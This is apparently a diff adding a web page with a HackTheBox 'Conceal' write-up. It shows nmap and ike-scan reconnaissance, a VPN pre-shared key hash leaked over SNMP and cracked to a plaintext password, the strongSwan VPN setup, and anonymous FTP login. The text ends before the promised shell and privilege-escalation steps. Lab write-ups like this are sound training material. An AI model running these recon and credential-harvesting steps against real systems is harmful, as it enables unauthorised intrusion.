@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Conceal</strong></h1>
+        <em>Released: 5th Jan 2019 / Pwned: September 13th 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        Conceal is hidden behind a VPN. Once you've configured the IPSec connection and connected successfully, the box opens up. There's a an FTP server which allows for anonymous upload of files, which you can use with the web server to gain a shell on the box. To priv-esc, you can use JuicyPotato to send a SYSTEM shell back to your attacking machine.<br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial scan:<br>
+        <code>nmap -sC -sV -O -oN nmap/initial.txt 10.10.10.116</code><br>
+        <br>
+        -sC default scripts<br>
+        -sV service enumeration<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;mkdir&nbsp;nmap<br>
+                root@gotham:~/ctf/conceal#&nbsp;nmap&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/initial.txt&nbsp;10.10.10.116<br>
+                [...]<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.035s&nbsp;latency).<br>
+                All&nbsp;1000&nbsp;scanned&nbsp;ports&nbsp;on&nbsp;10.10.10.116&nbsp;are&nbsp;filtered<br>
+                Too&nbsp;many&nbsp;fingerprints&nbsp;match&nbsp;this&nbsp;host&nbsp;to&nbsp;give&nbsp;specific&nbsp;OS&nbsp;details
+            </div>
+        </div><br>
+        <br>
+        Nothing :/<br>
+        A UDP scan shows that port 500 is open.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;nmap&nbsp;-sU&nbsp;10.10.10.116<br>
+                [...]<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                500/udp&nbsp;open&nbsp;&nbsp;isakmp
+            </div>
+        </div><br>
+        <br>
+        I ran service detection <code>-sV</code> and scripts -<code>sC</code> against port 500 to get more info about the service.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;nmap&nbsp;-p&nbsp;500&nbsp;-sU&nbsp;-sV&nbsp;-sC&nbsp;10.10.10.116<br>
+                [...]<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                500/udp&nbsp;open&nbsp;&nbsp;isakmp&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;8<br>
+                |&nbsp;ike-version:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;vendor_id:&nbsp;Microsoft&nbsp;Windows&nbsp;8<br>
+                |&nbsp;&nbsp;&nbsp;attributes:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS&nbsp;NT5&nbsp;ISAKMPOAKLEY<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RFC&nbsp;3947&nbsp;NAT-T<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;draft-ietf-ipsec-nat-t-ike-02\n<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IKE&nbsp;FRAGMENTATION<br>
+                |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;MS-Negotiation&nbsp;Discovery&nbsp;Capable<br>
+                |_&nbsp;&nbsp;&nbsp;&nbsp;IKE&nbsp;CGA&nbsp;version&nbsp;1<br>
+                Service&nbsp;Info:&nbsp;OS:&nbsp;Windows&nbsp;8;&nbsp;CPE:&nbsp;cpe:/o:microsoft:windows:8,&nbsp;cpe:/o:microsoft:windows
+            </div>
+        </div><br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) Port 500 - isakmp</strong></h2><br>
+        <code>isakmp</code> stands for <code>Internet Security Association and Key Management Protocol</code>.<br>
+        The <code>Internet Key Exchange</code> (IKE) is used to authenticate IPsec (VPN) connections.<br>
+        And the <code>Security Association</code> defines the cryptographic keys used for connection.<br>
+        <br>
+        With those 2 together, port 500 is used to authenticate VPN connections.<br>
+        <br>
+        Therefore, to access Conceal, we need to set up a VPN configuration so that we can connect to the box.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h3><strong>2a) ike-scan</strong></h3><br>
+        <code>ike-scan</code> can be used to gain information about the IPSec connection.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;ike-scan&nbsp;-M&nbsp;10.10.10.116<br>
+                Starting&nbsp;ike-scan&nbsp;1.9.4&nbsp;with&nbsp;1&nbsp;hosts&nbsp;(http://www.nta-monitor.com/tools/ike-scan/)<br>
+                10.10.10.116 Main&nbsp;Mode&nbsp;Handshake&nbsp;returned<br>
+                HDR=(CKY-R=ca0a7c616a6bb432)<br>
+                SA=(Enc=3DES&nbsp;Hash=SHA1&nbsp;Group=2:modp1024&nbsp;Auth=PSK&nbsp;LifeType=Seconds&nbsp;LifeDuration(4)=0x00007080)<br>
+                VID=1e2b516905991c7d7c96fcbfb587e46100000009&nbsp;(Windows-8)<br>
+                VID=4a131c81070358455c5728f20e95452f&nbsp;(RFC&nbsp;3947&nbsp;NAT-T)<br>
+                VID=90cb80913ebb696e086381b5ec427b1f&nbsp;(draft-ietf-ipsec-nat-t-ike-02\n)<br>
+                VID=4048b7d56ebce88525e7de7f00d6c2d3&nbsp;(IKE&nbsp;Fragmentation)<br>
+                VID=fb1de3cdf341b7ea16b7e5be0855f120&nbsp;(MS-Negotiation&nbsp;Discovery&nbsp;Capable)<br>
+                VID=e3a5966a76379fe707228231e5ce8652&nbsp;(IKE&nbsp;CGA&nbsp;version&nbsp;1)<br>
+                <br>
+                Ending&nbsp;ike-scan&nbsp;1.9.4:&nbsp;1&nbsp;hosts&nbsp;scanned&nbsp;in&nbsp;0.046&nbsp;seconds&nbsp;(21.70&nbsp;hosts/sec).&nbsp;&nbsp;1&nbsp;returned&nbsp;handshake;&nbsp;0&nbsp;returned&nbsp;notify
+            </div>
+        </div><br>
+        <br>
+        <code>SA=</code> are the Security Association parameters.<br>
+        The <code>VID</code> entries are IKE (Internet Key Exchange) settings.<br>
+        <br>
+        Using the information above, we can set up a IPSec VPN connection to Conceal.<br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain VPN Access</strong></h1>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) strongSwan</strong></h2><br>
+        <code>strongswan</code> is an IPsec VPN implementation that supports linux.<br>
+        <br>
+        Install it with <code>apt install strongswan</code>.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;apt&nbsp;install&nbsp;strongswan&nbsp;-y
+            </div>
+        </div><br>
+        <br>
+        There are 2 configuration files you need to set up:<br>
+        • <code>/etc/ipsec.conf</code> - the VPN connection settings<br>
+        • <code>/etc/ipsec.secrets</code> - passwords/keys<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>3a) /etc/ipsec.conf</strong></h3><br>
+        Edit <code>/etc/ipsec.conf</code> to configure the VPN connection parameters.<br>
+        strongSwan's ipsec.conf man page is here - <a href="https://wiki.strongswan.org/projects/strongswan/wiki/ConnSection">https://wiki.strongswan.org/projects/strongswan/wiki/ConnSection</a><br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;nano&nbsp;/etc/ipsec.conf
+            </div>
+        </div><br>
+        <br>
+            <div class="codebox">
+                [...]<br>
+                #htb&nbsp;Conceal&nbsp;connection<br>
+                conn&nbsp;conceal<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;auto=add<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type=transport<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;keyexchange=ikev1<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fragmentation=yes<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ike=3des-sha1-modp1024<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esp=3des-sha1<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;authby=psk<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;left=10.10.14.25<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;leftprotoport=tcp<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;right=10.10.10.116<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rightprotoport=tcp
+            </div>
+        </div><br>
+        <br>
+        <strong>Explanation of settings:</strong><br>
+        auto=add<br>
+        ◇ <code>auto</code> defines what happens when you start the connection by running <code>ipsec</code><br>
+        ◇ <code>start</code> means that connection will connect automatically when you <code>ipsec start</code><br>
+        ◇ <code>add</code> means that connection will load a connection but not start it<br>
+        type=transport<br>
+        ◇ the type of connection<br>
+        ◇ If type is the 1st value in the config, it fails, so I put it 2nd<br>
+        ◇ <code>transport</code> = host-to-host transport mode<br>
+        ◇ <code>tunnel</code> = host-to-host, host-to-subnet or subnet-to-subnet<br>
+        - <code>tunnel</code> requires defining IPs and subnets to connect to.<br>
+        - If you find subnets when running ike-scan or snmp-check, then you'll probably need tunnel mode<br>
+        ◇ <code>passthrough</code> = no IPsec processing should be done at all<br>
+        ◇ <code>drop</code> = packets should be discarded<br>
+        keyexchnage=ikev1<br>
+        ◇ We know the keyexchange is ikev1 from ike-scan and the Nmap script scan of port 500<br>
+        ▪ ike-scan - <code>VID=e3a5966a76379fe707228231e5ce8652 (IKE CGA version 1)</code><br>
+        ▪ nmap - <code>IKE CGA version 1</code><br>
+        fragmentation=yes<br>
+        ◇ if ike supports fragmentation, use it!<br>
+        ◇ oversized messages will be sent in fragments (makes sending large amounts of data e.g. easier/more stable)<br>
+        ◇ ike-scan reported that Conceal does support ike fragmentation - <code>VID=4048b7d56ebce88525e7de7f00d6c2d3 (IKE Fragmentation)</code><br>
+        ike=3des-sha1-modp1024<br>
+        ◇ <code>ike</code> defines the Ike key<br>
+        ◇ This can be found in the ike-scan output - <code>Enc=3DES Hash=SHA1 Group=2:modp1024</code><br>
+        ◇ This is phase 1 of IKE authentication/key exchange (useful to know for debugging vpn connection)<br>
+        esp=3des-sha1<br>
+        ◇ <code>esp</code> stands for Encapsulating Security Payload<br>
+        ◇ <code>esp</code> specifies the cipher suite, in the format <code>encryption-hashtype</code><br>
+        ◇ You can retrieve this info from ike-scan - <code>Enc=3DES Hash=SHA1</code><br>
+        ◇ This is phase 2 of IKE authentication/key exchange<br>
+        authby=psk<br>
+        ◇ <code>authby</code> defines IKE's authentication method<br>
+        ◇ You should get this info from ike-scan - <code>Auth=PSK</code><br>
+        left=10.10.14.25<br>
+        ◇ <code>left</code> is where you're connecting from/source IP<br>
+        leftprotoport=tcp<br>
+        ◇ <code>leftprotoport</code> defines the source port you're connecting via<br>
+        ◇ If TCP fails, try UDP<br>
+        right=10.10.10.116<br>
+        ◇ <code>right</code> is where you're connecting to/destination IP<br>
+        rightprotoport=tcp<br>
+        ◇ <code>rightprotoport</code> defines the destination port you're connecting to<br>
+        ◇ If TCP fails, try UDP<br>
+        <br>
+        <strong>Troubleshooting</strong><br>
+        <span style="text-decoration:underline;">#Connection Errors</span><br>
+        If you encounter errors, best place to troubleshoot according to IppSec is netgate, who make PfSense (an OpenBSD firewall) -<br>
+        <a href="https://docs.netgate.com/pfsense/en/latest/vpn/ipsec/ipsec-troubleshooting.html">https://docs.netgate.com/pfsense/en/latest/vpn/ipsec/ipsec-troubleshooting.html</a><br>
+        - and search for the error message you get.<br>
+        <br>
+        <span style="text-decoration:underline;">#Data/packet loss errors/weird issues</span><br>
+        If you're connected but suspect your data isn't being completely sent/having weird issues, try lowering your MTU - the Maximum Transmission Unit.<br>
+        1000 is low but it should work (need to learn more about this).<br>
+        <code>ifconfig &lt;interface&gt; mtu 100</code><br>
+        <code>ifconfig tun0 mtu 1000</code><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>3b) /etc/ipsec.secrets</strong></h3><br>
+        <code>/etc/ipsec.secrets</code> stores the VPN authentication keys/passwords.<br>
+        ike-scan reported that Conceal uses PSK authentication, but we currently don't have a key.<br>
+        <br>
+        <strong>Nmap</strong><br>
+        I returned to Nmap and ran script scans against all TCP and UDP ports, thinking I must have missed something.<br>
+        Eventually, you'll find that UDP port 161 is in fact open (despite being reported open|filtered initially).<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;nmap&nbsp;-p&nbsp;161&nbsp;-sU&nbsp;-sV&nbsp;-sC&nbsp;10.10.10.116<br>
+                [...]<br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                161/udp&nbsp;open&nbsp;&nbsp;snmp&nbsp;&nbsp;&nbsp;&nbsp;SNMPv1&nbsp;server&nbsp;(public)<br>
+                [...]<br>
+                |&nbsp;snmp-win32-software:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Visual&nbsp;C++&nbsp;2008&nbsp;Redistributable&nbsp;-&nbsp;x64&nbsp;9.0.30729.6161;&nbsp;2018-10-12T20:10:30<br>
+                |&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Visual&nbsp;C++&nbsp;2008&nbsp;Redistributable&nbsp;-&nbsp;x86&nbsp;9.0.30729.6161;&nbsp;2018-10-12T20:10:22<br>
+                |_&nbsp;&nbsp;VMware&nbsp;Tools;&nbsp;2018-10-12T20:11:02<br>
+                |&nbsp;snmp-win32-users:&nbsp;<br>
+                |&nbsp;&nbsp;&nbsp;Administrator<br>
+                |&nbsp;&nbsp;&nbsp;DefaultAccount<br>
+                |&nbsp;&nbsp;&nbsp;Destitute<br>
+                |_&nbsp;&nbsp;Guest<br>
+                Service&nbsp;Info:&nbsp;Host:&nbsp;Conceal
+            </div>
+        </div><br>
+        <br>
+        <strong>snmp-check</strong><br>
+        Run snmp-check against the port.<br>
+        You'll find a VPN PSK password hash in the Contact info.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;snmp-check&nbsp;10.10.10.116<br>
+                snmp-check&nbsp;v1.9&nbsp;-&nbsp;SNMP&nbsp;enumerator<br>
+                Copyright&nbsp;(c)&nbsp;2005-2015&nbsp;by&nbsp;Matteo&nbsp;Cantoni&nbsp;(www.nothink.org)<br>
+                <br>
+                [+]&nbsp;Try&nbsp;to&nbsp;connect&nbsp;to&nbsp;10.10.10.116:161&nbsp;using&nbsp;SNMPv1&nbsp;and&nbsp;community&nbsp;'public'<br>
+                [*]&nbsp;System&nbsp;information:<br>
+                &nbsp;&nbsp;Host&nbsp;IP&nbsp;address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;10.10.10.116<br>
+                &nbsp;&nbsp;Hostname&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Conceal<br>
+                &nbsp;&nbsp;Description&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;Hardware:&nbsp;AMD64&nbsp;Family&nbsp;23&nbsp;Model&nbsp;1&nbsp;Stepping&nbsp;2&nbsp;AT/AT&nbsp;COMPATIBLE&nbsp;-&nbsp;Software:&nbsp;Windows&nbsp;Version&nbsp;6.3&nbsp;(Build&nbsp;15063&nbsp;Multiprocessor&nbsp;Free)<br>
+                &nbsp;&nbsp;Contact&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;IKE&nbsp;VPN&nbsp;password&nbsp;PSK&nbsp;-&nbsp;9C8B1A372B1878851BE2C097031B6E43<br>
+                &nbsp;&nbsp;Location&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;-<br>
+                &nbsp;&nbsp;Uptime&nbsp;snmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;00:19:34.51<br>
+                &nbsp;&nbsp;Uptime&nbsp;system&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;00:19:08.17<br>
+                &nbsp;&nbsp;System&nbsp;date&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;2019-9-12&nbsp;11:18:02.8<br>
+                &nbsp;&nbsp;Domain&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;WORKGROUP<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        <strong>PSK Password Crack</strong><br>
+        Crack the hash at hashkiller - <a href="https://hashkiller.co.uk/Cracker">https://hashkiller.co.uk/Cracker</a><br>
+        <code>9C8B1A372B1878851BE2C097031B6E43</code><br>
+        <br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        The password is <code>Dudecake1!</code><br>
+        <br>
+        <strong>/etc/ipsec.secrets</strong><br>
+        With a PSK password, we can now configure <code>/etc/ipsec.secrets</code>.<br>
+        The format in <code>/etc/ipsec.secrets</code> is <code>&lt;source&gt; &lt;destination&gt; : PSK “&lt;password&gt;�</code>.<br>
+        <br>
+        My IP when doing this machine was 10.10.14.25, so my <code>ipsec.secrets</code> entry looked like this:<br>
+        <code>10.10.14.25 10.10.10.116 : PSK “Dudecake1!�</code><br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;nano&nbsp;/etc/ipsec.secrets<br>
+                [...]<br>
+                #&nbsp;this&nbsp;file&nbsp;is&nbsp;managed&nbsp;with&nbsp;debconf&nbsp;and&nbsp;will&nbsp;contain&nbsp;the&nbsp;automatically&nbsp;created&nbsp;private&nbsp;key<br>
+                include&nbsp;/var/lib/strongswan/ipsec.secrets.inc<br>
+                <br>
+                10.10.14.25&nbsp;10.10.10.116&nbsp;:&nbsp;PSK&nbsp;"Dudecake1!"
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-4" name="h3-4"></a><strong></strong>
+        <h3><strong>3c) Connect</strong></h3><br>
+        The IPsec VPN configuration is finally set up, and you can connect :)<br>
+        <br>
+        Run <code>ipsec stop</code> to kill any related processes, and then <code>ipsec start</code> to start ipsec and load any connections.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;ipsec&nbsp;stop<br>
+                root@gotham:~/ctf/conceal#&nbsp;ipsec&nbsp;start<br>
+                Starting&nbsp;strongSwan&nbsp;5.8.0&nbsp;IPsec&nbsp;[starter]...<br>
+                root@gotham:~/ctf/conceal#
+            </div>
+        </div><br>
+        <br>
+        To start the connection to Conceal, run <code>ipsec up &lt;config name&gt;</code><br>
+        In the output, look for <code>&lt;connection name&gt; established</code> to check that you've connected successfully with no errors.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;ipsec&nbsp;up&nbsp;conceal<br>
+                [...]<br>
+                generating&nbsp;QUICK_MODE&nbsp;request&nbsp;4281661862&nbsp;[&nbsp;HASH&nbsp;]<br>
+                sending&nbsp;packet:&nbsp;from&nbsp;10.10.14.25[500]&nbsp;to&nbsp;10.10.10.116[500]&nbsp;(60&nbsp;bytes)<br>
+                connection&nbsp;'conceal'&nbsp;established&nbsp;successfully
+            </div>
+        </div><br>
+        <br>
+        You can also run <code>ipsec status</code> to double-check.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;ipsec&nbsp;status<br>
+                Security&nbsp;Associations&nbsp;(1&nbsp;up,&nbsp;0&nbsp;connecting):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conceal[1]:&nbsp;ESTABLISHED&nbsp;101&nbsp;seconds&nbsp;ago,&nbsp;10.10.14.25[10.10.14.25]...10.10.10.116[10.10.10.116]<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conceal{1}:&nbsp;&nbsp;INSTALLED,&nbsp;TRANSPORT,&nbsp;reqid&nbsp;1,&nbsp;ESP&nbsp;SPIs:&nbsp;cba40473_i&nbsp;011b6740_o<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;conceal{1}:&nbsp;&nbsp;&nbsp;10.10.14.25/32[tcp]&nbsp;===&nbsp;10.10.10.116/32[tcp]
+            </div>
+        </div><br>
+        <br>
+        Nice! We're finally on the box :)<br>
+        <br>
+        <a id="h2-4" name="h2-4"></a><strong></strong>
+        <h2><strong>4) Nmap - Round 2</strong></h2><br>
+        Nmap's default TCP SYN scan will fail over a VPN.<br>
+        You have to use <code>-sT</code> to run a full TCP CONNECT scan.<br>
+        <br>
+        Quickly scan all TCP ports on Conceal, and then run service detection and scripts against the open ports.<br>
+        <code>ports=$(nmap -p- -sT -T4 10.10.10.116 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)</code> - scans all tcp ports and stores the open ports from the Nmap output into a comma-separated stored in a $ports environment vairables<br>
+        <code>nmap -p $ports -T4 -sT -sV -sC -O -oN nmap/tcp-open_ports-sVCO.txt 10.10.10.116</code> - scan the ports in $ports environment variable with service detection and scripts<br>
+        <br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal#&nbsp;echo&nbsp;"[+]&nbsp;Scanning&nbsp;all&nbsp;TCP&nbsp;ports..";&nbsp;ports=$(nmap&nbsp;-p-&nbsp;-sT&nbsp;-T4&nbsp;10.10.10.116&nbsp;|&nbsp;grep&nbsp;^[0-9]&nbsp;|&nbsp;cut&nbsp;-d&nbsp;'/'&nbsp;-f&nbsp;1&nbsp;|&nbsp;tr&nbsp;'\n'&nbsp;','&nbsp;|&nbsp;sed&nbsp;s/,$//);&nbsp;echo&nbsp;"[+]&nbsp;Scanning&nbsp;TCP&nbsp;ports&nbsp;$ports&nbsp;with&nbsp;-sV&nbsp;-sC...";&nbsp;nmap&nbsp;-p&nbsp;$ports&nbsp;-T4&nbsp;-sT&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-open_ports-sVCO.txt&nbsp;10.10.10.116<br>
+                [+]&nbsp;Scanning&nbsp;all&nbsp;TCP&nbsp;ports..<br>
+                [+]&nbsp;Scanning&nbsp;TCP&nbsp;ports&nbsp;21,80,135,139,445,49664,49665,49666,49667,49668,49669,49670&nbsp;with&nbsp;-sV&nbsp;-sC...<br>
+                Starting&nbsp;Nmap&nbsp;7.70&nbsp;(&nbsp;https://nmap.org&nbsp;)<br>
+                Nmap&nbsp;scan&nbsp;report&nbsp;for&nbsp;10.10.10.116<br>
+                Host&nbsp;is&nbsp;up&nbsp;(0.032s&nbsp;latency).<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;VERSION<br>
+                21/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;ftp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;ftpd<br>
+                |_ftp-anon:&nbsp;Anonymous&nbsp;FTP&nbsp;login&nbsp;allowed&nbsp;(FTP&nbsp;code&nbsp;230)<br>
+                |&nbsp;ftp-syst:&nbsp;<br>
+                |_&nbsp;&nbsp;SYST:&nbsp;Windows_NT<br>
+                80/tcp&nbsp;&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;IIS&nbsp;httpd&nbsp;10.0<br>
+                |&nbsp;http-methods:&nbsp;<br>
+                |_&nbsp;&nbsp;Potentially&nbsp;risky&nbsp;methods:&nbsp;TRACE<br>
+                |_http-server-header:&nbsp;Microsoft-IIS/10.0<br>
+                |_http-title:&nbsp;IIS&nbsp;Windows<br>
+                135/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                139/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;netbios-ssn&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;netbios-ssn<br>
+                445/tcp&nbsp;&nbsp;&nbsp;open&nbsp;&nbsp;microsoft-ds?<br>
+                49664/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                49665/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                49666/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                49667/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                49668/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                49669/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                49670/tcp&nbsp;open&nbsp;&nbsp;msrpc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;RPC<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        <strong>Ports</strong><br>
+        • 21/ftp - Anonymous login is enabled, which is worth investigating<br>
+        • 80/http - A web server, which are usually of interest<br>
+        • 139/smb - A network share<br>
+        • 445/smb - Secure network share<br>
+        • And lots of RPC ports<br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) 21/ftp - Test file upload</strong></h2><br>
+        Nmap informed us that we anonymous login is enabled on the ftp server.<br>
+            <div class="codebox">
+                root@gotham:~/ctf/conceal/80#&nbsp;ftp&nbsp;10.10.10.116<br>
+                Connected&nbsp;to&nbsp;10.10.10.116.<br>
+                220&nbsp;Microsoft&nbsp;FTP&nbsp;Service<br>
+                Name&nbsp;(10.10.10.116:root):&nbsp;Anonymous<br>
+                331&nbsp;Anonymous&nbsp;access&nbsp;allowed,&nbsp;send&nbsp;identity&nbsp;(e-mail&nbsp;name)&nbsp;as&nbsp;password.<br>
+                Password:<br>
+                230&nbsp;User&nbsp;logged&nbsp;in.<br>
+                Remote&nbsp;system&nbsp;type&nbsp;is&nbsp;Windows_NT.<br>
+                ftp&gt;&nbsp;ls<br>
+                200&nbsp;PORT&nbsp;command&nbsp;successful.<br>
+                125&nbsp;Data&nbsp;connection&nbsp;already&nbsp;open;&nbsp;Transfer&nbsp;starting.<br>
+                226&nbsp;Transfer&nbsp;complete.
+            </div>
+        </div><br>
+        <br>
+        Test if you can upload files.<br>
